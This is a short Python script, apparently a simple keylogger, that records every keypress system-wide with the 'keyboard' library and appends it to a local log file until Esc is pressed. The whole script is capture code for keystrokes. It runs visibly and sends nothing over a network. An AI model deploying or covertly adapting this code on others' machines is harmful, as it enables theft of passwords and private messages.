import keyboard
from datetime import datetime
import os

# Setup log file
log_dir = "logs"
os.makedirs(log_dir, exist_ok=True)
log_file = os.path.join(log_dir, "key_log.txt")

# Initialize log file with session start timestamp
with open(log_file, "a") as f:
    f.write(f"\n[Session Start: {datetime.now()}]\n")

# Log keys
def log_key(event):
    try:
        key_name = event.name  # Key name

        if key_name is None:
            key_name = "[UNKNOWN]"  # Handle undefined keys
        elif key_name == "space":
            key_name = " [SPACE] "
        elif key_name == "enter":
            key_name = " [ENTER]\n"
        elif key_name == "backspace":
            key_name = " [BACKSPACE] "

        with open(log_file, "a") as f:
            f.write(key_name)
    except Exception as e:
        print(f"Error logging key: {e}")


# Start the keylogger
keyboard.on_press(log_key)

print("Keylogger is running. Press 'esc' to stop.")
keyboard.wait("esc")  # Stop the script when 'esc' is pressed
